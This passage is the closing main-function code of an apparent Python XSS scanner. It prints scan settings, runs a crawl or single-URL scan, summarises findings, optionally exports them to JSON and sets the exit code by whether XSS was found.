    cprint(f"[*] Verbosity   : {'HIGH' if verbosity >= 2 else 'MEDIUM' if verbosity == 1 else 'LOW'}", Color.WHITE)
    if cookies:
        cprint(f"[*] Cookies     : {len(cookies)} key(s)", Color.WHITE)
    cprint("")

    start_time = time.time()
    all_findings = []

    try:
        if args.crawl:
            all_findings = crawl_and_scan(
                args.url,
                cookies=cookies,
                extra_headers=headers,
                verbosity=verbosity,
                use_variants=use_variants,
                max_pages=args.max_pages,
            )
        else:
            all_findings = scan_url(
                args.url,
                cookies=cookies,
                extra_headers=headers,
                verbosity=verbosity,
                use_variants=use_variants,
            )
    except KeyboardInterrupt:
        cprint("\n[!] Scan interrupted by user.", Color.YELLOW)

    elapsed = time.time() - start_time
    print_summary(all_findings, elapsed)

    if args.json:
        export_json(all_findings, args.json)

    # Exit code: 0 = clean, 1 = findings
    xss_found = any("XSS" in f["type"] for f in all_findings)
    sys.exit(1 if xss_found else 0)


if __name__ == "__main__":
    main()
